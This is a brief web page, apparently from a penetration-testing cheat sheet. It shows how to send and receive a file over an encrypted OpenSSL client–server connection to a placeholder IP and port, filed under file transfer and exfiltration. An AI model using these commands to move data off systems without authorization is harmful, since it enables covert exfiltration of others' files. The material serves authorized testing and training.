<title>Openssl File Transfer</title>
</head><body>Openssl can be used to transfer files too! See in File Transfer / Exfiltration<br/>
<br/>
#Connect, Receive<br/>
openssl s_client -quiet -connect &lt;ip&gt;:&lt;port&gt; &gt; file.out<br/>
<br/>
#Listen, Send<br/>
openssl s_server -quiet -key &lt;key&gt; -cert &lt;cert&gt; -port &lt;port&gt; &lt; file.in</body></html>
